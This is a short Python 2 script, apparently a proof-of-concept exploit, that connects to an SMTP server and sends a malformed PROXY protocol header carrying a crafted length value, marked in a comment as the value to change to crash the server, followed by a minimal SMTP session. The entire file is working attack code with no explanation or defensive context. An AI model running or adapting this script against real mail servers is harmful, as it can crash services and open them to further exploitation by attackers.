#!/usr/bin/env python2

from socket import *
import time
import base64
import sys
import struct

host='192.168.1.48'
domain='example.nil'
port=25
num = 10028 # 'len', change to crash 

sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))

i='\nXX\n1\n%d,4#2\n\n' % num

s='PROXY TCP4 ::/fooba' + i + ' 192.168.0.11 56324 25\r\n'
sock.sendall(s)
print sock.recv(1000)

sock.sendall('EHLO %s\n' % domain)
print sock.recv(1000)

s='MAIL FROM:<> \n'
sock.sendall(s)
print sock.recv(1000)

s='RCPT TO: postmaster\n'
sock.sendall(s)
print sock.recv(1000)

s='DATA\n'
sock.sendall(s)
print sock.recv(1000)
s='HELLO this is a test\n.\n'
sock.sendall(s)

time.sleep(1)

print sock.recv(1000)
sock.close()


